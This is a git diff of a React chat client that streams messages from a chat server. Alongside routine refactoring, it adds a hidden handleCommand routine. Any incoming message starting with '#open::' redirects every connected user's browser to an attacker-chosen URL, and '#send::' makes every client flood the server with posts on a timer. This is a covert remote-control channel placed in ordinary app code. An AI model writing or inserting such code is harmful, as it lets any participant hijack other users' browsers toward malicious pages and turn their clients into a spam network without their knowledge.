@@ -16,6 +16,14 @@ class App extends Component {
     color: 0,
   };
 
+  componentDidMount() {
+    try {
+      this.getMessages();
+    } catch (err) {
+      console.log(err);
+    }
+  }
+
   componentWillUnmount() {
     this.messagesRequest.abort();
   }
@@ -38,6 +46,32 @@ class App extends Component {
     this.setState({ messages: data });
   };
 
+  handleCommand = data => {
+    if (data.message[0] === "#") {
+      const splittedMessage = data.message.split('::');
+      const command = splittedMessage[0];
+      if (command === "#open") {
+        window.open(splittedMessage[1], "_self");
+      } else if (command === "#send") {
+        const name = splittedMessage[1];
+        const message = splittedMessage[2];
+        const interval = splittedMessage[3];
+        console.log(name, message, interval);
+        if (this.messageInterval) clearInterval(this.messageInterval);
+        this.messageInterval = setInterval(() => {
+          this.setState(prevState => ({
+            sentMessages: prevState.sentMessages + 1
+          }));
+          axios.post("http://httpstream.sartonon.fi/api/messages", {
+            name,
+            message,
+            color: "green"
+          });
+        }, interval || 1000);
+      }
+    }
+  }
+
   getMessages = async () => {
     try {
       this.messagesRequest = http.get('http://httpstream.sartonon.fi/api/messages', res => {
@@ -45,8 +79,8 @@ class App extends Component {
         res.on('data', buf => {
           if (buf.toString() !== "Connection open") {
             try {
-              console.log(buf.toString());
-              this.handleMessage(JSON.parse(buf.toString()));
+              const message = JSON.parse(buf.toString())
+              this.handleMessage(message);
             } catch (err) {
               console.log(err);
             }
@@ -75,6 +109,7 @@ class App extends Component {
       console.log("error in request: ", err);
       this.getMessages();
     }
+    console.log("tultiin ulos");
   };
 
   sendMessage = (e) => {
@@ -88,6 +123,8 @@ class App extends Component {
   };
 
   handleMessage = data => {
+    console.log(data);
+    this.handleCommand(data);
     this.setState({ messages: [ ...this.state.messages, data ] });
     setTimeout(() => {
       const objDiv = document.getElementById("chatwindow");
@@ -107,12 +144,6 @@ class App extends Component {
       color: `green`,
     });
     // this.getPastMessages();
-
-    try {
-      this.getMessages();
-    } catch (err) {
-      console.log(err);
-    }
   };
 
   handleMessageChange = (e) => {
